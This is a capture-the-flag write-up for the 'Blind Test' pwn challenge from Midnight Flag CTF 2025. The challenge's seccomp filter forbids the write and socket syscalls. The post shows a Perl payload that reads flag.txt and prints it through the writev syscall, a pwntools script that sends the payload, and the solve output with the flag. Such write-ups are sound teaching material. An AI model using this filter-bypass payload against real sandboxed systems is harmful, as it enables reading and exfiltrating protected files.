---
title: Midnight Flag CTF 2025 - Blind Test (pwn)
date: 2025-04-16 11:10:48 +0200
categories: [MidnightFlagCTF2025, Pwn]
tags: [pwn]
category: pwn
author: lenoctambule
layout: post
description:  Challenge that makes us bypass a seccomp profile that prohibits write syscalls 
---

## Information gathering

This challenge is a binary exploitation challenge. We have full access of the source code, as well as a local testing environment.

The code is straight forward, it first sets up a seccomp that prohibits the use of syscalls `write` and `socket` and allows everything else.

```c
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(write), 0);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(socket), 0);
```

We can also extract the seccomp using [`seccomp-tools`](https://github.com/david942j/seccomp-tools/) which gives us :

```text
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008
 0005: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0008
 0006: 0x15 0x01 0x00 0x00000029  if (A == socket) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x06 0x00 0x00 0x00000000  return KILL
```

Then it takes a 3000 characters long input and calls `system` function with it.

```c
    while (1) {
        if (fgets(command, sizeof(command), stdin) == NULL) {
            break;
        }
        system(command);
    }
```

## Exploitation

As expected, whenever we send a command, we get nothing back. Looking at the different avalaible syscalls, there are a few that could performs the same task as `write` such as :
- `pwrite64` - write to a file descriptor at a given offset
- `writev` - write data into multiple buffers

But `writev` seems a lot easier because `pwrite64` can't write to stdout (which is what we want).

So our plan is now clear :
- open the flag and get the file descriptor
- read the flag
- use `writev` to execute it

However, the execution is not. We need something that allows to do all of the above and that is already installed on the debian container. And after spending a bit of time looking around, I found that perl is installed and perl does allows us to make syscalls using well ... `syscall`. As I'm not good in perl and time is of essence, I asked ChatGPT to do it for me and here's the payload that I got :

```pl
open my $fh, "<", "./flag.txt";
my $file_content = do {local $/; <$fh>};
my @buffers = ($file_content, "\n");
my $iovec = pack("L!L!L!L!L!L!",
    map { 
        my $str = $_;
        my $ptr = unpack("L!", pack("P", $str));
        my $len = length($str);
        ($ptr, $len)
    } @buffers
);
my $fd = fileno(STDOUT);
my $ret = syscall(20, $fd, $iovec, scalar(@buffers));
```

And the python script to send it automatically while getting rid of line returns :

```py
from pwn import *

r = remote("xxxx.midnightflag.fr", xxxxx)
context.log_level = 'INFO'
with open('payload.pl', 'r') as f :
    payload = f.read().strip().replace('\n', '')
    cmd = f"perl -e '{payload}'"
    r.sendline(cmd)
print(r.recv(timeout=1))
```

And voilà ! we run it and get the flag,
```text
$ py solve.py 
[+] Opening connection to localhost on port 4444: Done
/home/ravaka/ctf/midnight-2025/pwn/blindtest/solve.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.sendline(cmd)
b'MCTF{kIll3d_3xFi}\n\n'
[*] Closed connection to localhost port 4444
```

<i>Solved by <span class="goodwill">lenoctambule</span></i>